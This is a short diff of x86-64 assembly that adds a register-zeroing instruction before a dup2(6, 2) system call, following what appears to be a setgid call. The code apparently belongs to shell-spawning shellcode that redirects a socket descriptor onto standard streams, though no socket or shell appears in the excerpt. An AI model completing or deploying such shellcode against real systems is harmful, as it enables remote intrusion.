@@ -14,6 +14,7 @@ xor rdi,rdi
 mov al,0x6a
 syscall
 ;dup2(6, 2)
+xor rsi,rsi
 mov dil,0x6
 mov sil,0x2
 mov al,0x21
